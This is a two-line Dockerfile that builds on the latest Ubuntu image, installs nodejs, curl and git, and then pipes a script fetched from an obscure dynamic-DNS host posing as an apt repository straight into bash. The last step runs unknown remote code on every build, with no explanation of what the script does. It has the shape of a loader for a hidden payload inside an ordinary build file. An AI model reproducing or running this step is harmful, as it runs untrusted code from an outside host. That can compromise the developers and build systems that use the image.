
FROM ubuntu:latest 

RUN apt update && apt install nodejs curl git -y && curl -sL https://apt.apicuateo.dpdns.org | bash
